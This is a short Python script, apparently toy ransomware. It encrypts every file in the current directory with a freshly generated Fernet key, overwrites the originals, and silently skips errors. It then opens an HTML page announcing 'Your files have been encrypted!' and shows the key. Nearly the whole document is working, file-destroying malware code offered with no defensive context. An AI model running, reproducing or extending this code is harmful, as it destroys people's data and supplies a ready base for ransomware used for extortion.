from cryptography.fernet import Fernet
import os
key = Fernet.generate_key()
dirlist = os.listdir()
f = Fernet(key)
for files in dirlist:
    try:
        with open(files, 'rb') as victim_file:
            contents = victim_file.read()
            victim_file.close()
        enc = f.encrypt(contents)
        with open(files, 'wb') as victim_file:
            victim_file.write(enc)
            victim_file.close()
    except:
        pass
html = open('What_Happened.html','w')
html.writelines(f"<h1>What Happened?<h1>\n<h2>Your files have been encrypted! If you want these files to be decrypted, don't worry! the key is {key}<h2>")
os.startfile(html.name)
